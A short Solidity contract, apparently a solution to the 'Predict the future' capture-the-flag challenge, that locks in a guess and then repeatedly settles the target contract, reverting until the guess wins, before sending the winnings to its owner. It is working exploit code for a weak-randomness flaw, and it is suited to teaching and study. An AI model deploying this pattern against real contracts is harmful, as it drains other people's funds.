pragma solidity ^0.4.21;

import "./PredictTheFuture.sol";

contract SolutionPredictTheFuture {
    address public owner;
    PredictTheFuture private _predictTheFuture;

    function SolutionPredictTheFuture(address predictTheFutureAddress) public {
        owner = msg.sender;
        _predictTheFuture = PredictTheFuture(predictTheFutureAddress);
    }

    function lockInGuess(uint8 n) public payable {
        require(msg.value == 1 ether);
        _predictTheFuture.lockInGuess.value(msg.value)(n);
    }

    function attack() public payable {
        require(msg.sender == owner);

        _predictTheFuture.settle();

        require(_predictTheFuture.isComplete());

        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
